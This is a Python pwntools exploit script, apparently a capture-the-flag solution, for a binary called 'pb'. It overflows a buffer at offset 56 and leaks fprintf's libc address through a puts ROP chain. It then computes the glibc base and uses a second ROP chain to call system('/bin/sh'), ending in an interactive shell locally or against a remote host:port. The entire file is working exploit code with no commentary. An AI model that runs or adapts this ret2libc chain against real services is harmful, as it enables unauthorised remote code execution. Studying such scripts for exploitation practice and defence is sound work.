#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('pb')
glibc = ELF('glibc/libc.so.6', checksec=False)
rop = ROP(elf)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def main():
    p = get_process()

    offset = 56
    junk = b'A' * offset

    payload  = junk
    payload += p64(rop.rdi[0])
    payload += p64(elf.got.fprintf)
    payload += p64(elf.plt.puts)
    payload += p64(elf.sym.main)

    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Insert location of the library: ', payload)
    p.recvline()
    p.recvline()
    p.recvline()

    fprintf_addr = u64(p.recvline().strip().ljust(8, b'\0'))
    p.info(f'Leaked fprintf() address: {hex(fprintf_addr)}')

    glibc.address = fprintf_addr - glibc.sym.fprintf
    p.info(f'Glibc base address: {hex(glibc.address)}')

    payload  = junk
    payload += p64(rop.rdi[0])
    payload += p64(next(glibc.search(b'/bin/sh')))
    payload += p64(rop.ret[0])
    payload += p64(glibc.sym.system)

    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Insert location of the library: ', payload)
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
